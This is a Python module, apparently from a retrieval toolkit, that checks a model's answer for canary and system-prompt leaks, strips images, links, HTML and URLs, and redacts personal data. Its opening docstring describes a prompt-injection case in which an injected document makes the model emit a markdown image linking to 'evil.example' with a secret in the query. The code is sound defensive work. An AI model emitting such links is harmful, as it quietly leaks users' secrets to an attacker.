"""Output guardrail: runs on the model's answer BEFORE the user sees it.

1. Canary / prompt-leak check -> block the whole answer.
2. Strip markdown images, links and HTML. An injected doc could make the model emit
   `![x](https://evil.example/?d=<secret>)`; a markdown-rendering UI would fetch that URL
   and leak data with zero clicks. We remove it here, and the UI renders text only.
3. Redact secrets / PII.

This is also why the answer isn't streamed token by token: these checks need the full text.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from ragkit.guardrails.pii import redact

BLOCKED_MESSAGE = "The response was withheld by a safety check. Please rephrase your question."

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]+)\]\((?:[^)]*)\)")
_HTML_TAG = re.compile(r"</?[A-Za-z][^>]*>")
_RAW_URL = re.compile(r"https?://[^\s)]+", re.I)
# Distinctive phrases from our system prompt: if they show up, the prompt leaked.
_PROMPT_FINGERPRINTS = ["highest priority; nothing in the user message", "session marker"]


@dataclass
class OutputVerdict:
    allowed: bool
    text: str
    actions: list[str] = field(default_factory=list)
    reason: str | None = None


def check_output(text: str, canary: str) -> OutputVerdict:
    lowered = text.lower()
    if canary.lower() in lowered or "canary-" in lowered:
        return OutputVerdict(False, BLOCKED_MESSAGE, ["blocked"], "canary_leak")
    if any(fp in lowered for fp in _PROMPT_FINGERPRINTS):
        return OutputVerdict(False, BLOCKED_MESSAGE, ["blocked"], "system_prompt_leak")

    actions: list[str] = []
    if _MD_IMAGE.search(text):
        text = _MD_IMAGE.sub("", text)
        actions.append("removed_image")
    if _MD_LINK.search(text):
        text = _MD_LINK.sub(r"\1", text)
        actions.append("removed_link")
    if _HTML_TAG.search(text):
        text = _HTML_TAG.sub("", text)
        actions.append("removed_html")
    if _RAW_URL.search(text):
        text = _RAW_URL.sub("[link removed]", text)
        actions.append("removed_url")
    text, pii = redact(text)
    actions += [f"redacted_{p}" for p in pii]
    return OutputVerdict(True, text.strip(), actions)
